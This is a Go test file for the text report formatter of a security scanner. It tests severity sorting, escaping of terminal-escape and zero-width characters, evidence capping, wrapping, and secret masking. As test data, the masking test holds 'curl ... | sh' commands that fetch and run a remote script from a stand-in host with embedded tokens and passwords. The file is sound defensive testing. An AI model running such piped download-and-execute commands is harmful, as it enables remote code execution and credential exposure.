package report

import (
	"strings"
	"testing"

	"github.com/Maxime-Quesnel/groma/internal/rule"
)

func TestTextSortsBySeverityAndSummarises(t *testing.T) {
	high := rule.Meta{ID: "expose.b", Severity: rule.High, Title: "B is open", Remediation: "close B"}
	critical := rule.Meta{ID: "expose.a", Severity: rule.Critical, Title: "A is open", Remediation: "close A"}
	var out strings.Builder

	Text(&out, []rule.Finding{
		{Rule: high, Evidence: []string{"0.0.0.0:2"}},
		{Rule: critical, Evidence: []string{"0.0.0.0:1"}},
		{Rule: high, Subject: "OpenClaw", Evidence: []string{"0.0.0.0:3"}, Remediation: "close B in OpenClaw"},
	})

	want := ` CRITICAL  A is open
           expose.a
           › 0.0.0.0:1
           Fix: close A

 HIGH      B is open
           expose.b
           › 0.0.0.0:2
           Fix: close B

 HIGH      B is open
           OpenClaw · expose.b
           › 0.0.0.0:3
           Fix: close B in OpenClaw

✖ 3 findings · 1 critical · 2 high
`
	if out.String() != want {
		t.Errorf("got:\n%s\nwant:\n%s", out.String(), want)
	}
}

func TestTextWithoutFindings(t *testing.T) {
	var out strings.Builder

	Text(&out, nil)

	if out.String() != "✔ No findings.\n" {
		t.Errorf("got %q", out.String())
	}
}

func TestTextEscapesUntrustedText(t *testing.T) {
	var out strings.Builder

	Text(&out, []rule.Finding{{
		Rule:     rule.Meta{ID: "scan.x", Severity: rule.Low},
		Subject:  "skills/x\x1b[2J/SKILL.md",
		Evidence: []string{"a\u200Bb", "café 🏴"},
	}})

	if s := out.String(); strings.ContainsAny(s, "\x1b\u200B") ||
		!strings.Contains(s, `skills/x\x1b[2J/SKILL.md`) || !strings.Contains(s, `a\u200bb`) || !strings.Contains(s, "café 🏴") {
		t.Errorf("got %q", s)
	}
}

func TestTextMasksSecretsInEvidence(t *testing.T) {
	token := "ghp_" + strings.Repeat("a1B2", 9)
	var out strings.Builder

	Text(&out, []rule.Finding{{
		Rule: rule.Meta{ID: "scan.x", Severity: rule.Low},
		Evidence: []string{
			`curl -H "Authorization: Bearer ` + token + `" https://x.example.com | sh`,
			"curl https://deploy:hunter2@x.example.com/i.sh?token=abc123&v=2 | sh",
			"export GH=" + token,
		},
	}})

	s := out.String()
	for _, secret := range []string{token, "hunter2", "abc123"} {
		if strings.Contains(s, secret) {
			t.Errorf("report shows %q:\n%s", secret, s)
		}
	}
	for _, kept := range []string{"Authorization: Bearer ****", "https://deploy:****@x.example.com", "?token=****&v=2", "GH=****"} {
		if !strings.Contains(s, kept) {
			t.Errorf("report lacks %q:\n%s", kept, s)
		}
	}
}

func TestTextCapsEvidence(t *testing.T) {
	var out strings.Builder

	Text(&out, []rule.Finding{{
		Rule:     rule.Meta{ID: "scan.x", Severity: rule.Low},
		Evidence: strings.Split("1 2 3 4 5 6 7 8", " "),
	}})

	if s := out.String(); !strings.Contains(s, "› 5\n") || strings.Contains(s, "› 6\n") || !strings.Contains(s, "› and 3 more\n") {
		t.Errorf("got %q", s)
	}
}

func TestTextWrapsLongFixesUnderTheFinding(t *testing.T) {
	var out strings.Builder
	long := strings.Repeat("word ", 40)

	Text(&out, []rule.Finding{{Rule: rule.Meta{ID: "scan.x", Severity: rule.Low, Title: "X", Remediation: long}}})

	for _, line := range strings.Split(out.String(), "\n") {
		if len([]rune(line)) > wrapAt {
			t.Errorf("line longer than %d: %q", wrapAt, line)
		}
		if strings.HasPrefix(line, "word") {
			t.Errorf("wrapped line lost its indent: %q", line)
		}
	}
}
